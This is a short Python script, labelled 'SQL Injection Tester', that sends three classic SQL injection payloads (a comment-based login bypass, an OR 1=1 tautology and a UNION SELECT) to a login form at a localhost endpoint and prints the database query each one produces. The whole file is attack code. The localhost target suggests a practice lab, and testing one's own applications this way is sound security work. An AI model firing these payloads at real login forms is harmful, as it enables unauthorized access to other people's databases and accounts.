import requests

url = "http://localhost:5000/sqli"
payloads = ["admin' --", "' OR 1=1 --", "' UNION SELECT null --"]

print("[+] SQL Injection Tester")
for p in payloads:
    r = requests.post(url, data={"username": p})
    print(f"Payload: {p}\nResponse: {r.text.split('Query Executed: ')[-1].split('</p>')[0]}\n")
